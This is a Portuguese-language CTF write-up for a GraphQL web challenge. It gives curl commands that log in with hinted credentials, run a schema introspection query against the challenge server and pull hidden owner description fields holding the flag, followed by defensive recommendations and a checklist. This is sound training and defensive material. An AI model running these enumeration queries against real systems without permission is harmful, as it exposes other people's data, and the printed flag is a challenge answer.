# CTF Write-up — Secret Supernovas

- **Evento:** CSS CTF Semester 2 2026 (Cybersecurity Society Sydney)
- **Plataforma:** https://ctf.cybersecurity.sydney/
- **Desafio:** Secret Supernovas
- **Categoria:** Web
- **Pontos:** 50
- **Alvo:** http://34.116.80.78:9982/
- **Data de resolução:** 2026-09-30
- **Status:** ✅ Resolvido (submissão retornou "Correct")

---

## Flag

```
CSSCTF{we_l000ve_grafs}
```

---

## Enunciado

> This is just a list of stars. Nothing else to see here...
>
> Flag Format: CSSCTF{...}

O tom ("nada mais para ver aqui...") sugere que há **dados escondidos** além do que a
interface mostra — típico de vazamento por **introspection de GraphQL**.

---

## Reconhecimento

1. A raiz (`/`) responde `303 See Other` → `/login`. É uma aplicação **SvelteKit**
   ("Star City Observatory").
2. A página de login entrega as credenciais na própria dica:

   ```
   Need an account? cadet/star
   ```

3. Autenticando via `POST /login` com `username=cadet&password=star`, o servidor
   devolve um cookie de sessão (UUID) e redireciona para `/`.

   ```bash
   curl -s -i -c cookies.txt -X POST http://34.116.80.78:9982/login \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data 'username=cadet&password=star'
   # set-cookie: session=<uuid>; HttpOnly; SameSite=Lax
   ```

4. A home mostra "Stars!" e um placeholder "Aligning telescope…" — a lista é
   carregada por JavaScript. Inspecionando o bundle do SvelteKit
   (`_app/immutable/nodes/2.*.js`), descobre-se a origem dos dados:

   ```js
   await fetch(`/graphql`, {
     method: 'POST',
     headers: { 'content-type': 'application/json' },
     body: JSON.stringify({ query: `query Stars {
       stars { id name spectralClass magnitude classification galaxy { name } }
     }` })
   })
   ```

   → A aplicação usa um endpoint **GraphQL** em `/graphql`.

## Exploração

### 1. Introspection do schema

O endpoint GraphQL permite **introspection** (deveria estar desabilitada em produção).
Consultando o schema, aparecem campos e queries que a UI **não** usa:

```
Query:   galaxies, galaxy(id), star(id), stars, user(id)
Star:    id, name, classification, magnitude, spectralClass, galaxy, owner  <-- "owner" oculto
Person:  id, first_name, last_name, description, date_of_birth              <-- "description" oculto
Galaxy:  id, name, type, distanceLy, stars
```

A query original só pedia `id name spectralClass magnitude classification galaxy{name}`.
Os campos **`Star.owner`** e **`Person.description`** ficaram de fora — e é aí que mora o segredo.

Comando de introspection:

```bash
curl -s -b cookies.txt http://34.116.80.78:9982/graphql \
  -H 'content-type: application/json' \
  --data '{"query":"query{__schema{types{name kind fields{name}}}}"}'
```

### 2. Consultando os campos ocultos

Refazendo a query `stars` incluindo `owner { ... description }`:

```bash
curl -s -b cookies.txt http://34.116.80.78:9982/graphql \
  -H 'content-type: application/json' \
  --data '{"query":"query{ stars{ id name classification owner{ first_name last_name description } } }"}'
```

Resultado (resumido):

```
[1]  Arrowhead        | owner=Felicity | desc=Systems lead. Keeps the telescope array online.
[3]  Spartan          | owner=John     | desc=Security. Escorts visitors during night sessions.
[5]  Black Canary     | owner=Laurel   | desc=CSSCTF{we_l000ve_grafs}     <-- FLAG
...
[11] Secret Supernova | owner=Oliver   | desc=Observatory Director. Approves all new catalogue entries.
```

A flag estava na `description` do **owner** da estrela #5 (Black Canary / Laurel), um
campo que a interface web nunca renderiza.

## Submissão

Flag inserida no campo "Bandeira" do desafio → resposta **"Correct"**.

---

## Causa raiz / Lição

Duas falhas combinadas de **API GraphQL**:

1. **Introspection habilitada** em produção — expõe todo o schema (tipos, campos e queries),
   revelando superfície de ataque que a UI esconde.
2. **Excessive Data Exposure / Broken Object-Level Authorization** — campos sensíveis
   (`owner`, `description`) são retornáveis por qualquer usuário autenticado, mesmo não
   sendo usados/exibidos pelo front-end. "Não mostrar na tela" ≠ "não expor pela API".

**Recomendações defensivas:**
- Desabilitar introspection do GraphQL em produção (`introspection: false`).
- Aplicar autorização por **campo/objeto** no resolver, não confiar no cliente para filtrar.
- Não retornar dados sensíveis em tipos acessíveis publicamente; usar tipos/queries distintos por papel.
- Considerar *query allow-listing* (persisted queries) para limitar as consultas aceitas.

## Metodologia (checklist para desafios Web/GraphQL)

1. Seguir redirects e mapear autenticação (aqui, credenciais vinham na própria dica).
2. Identificar a stack (headers `x-sveltekit-page`, estrutura `_app/immutable/` → SvelteKit).
3. Ler os bundles JS do front-end para achar endpoints de API (`/graphql`).
4. Tentar **introspection** para enumerar todo o schema.
5. Comparar os campos do schema com os que a UI realmente pede — o "delta" costuma ser o segredo.
6. Consultar os campos/queries ocultos (`owner`, `description`, `user(id)`, etc.).
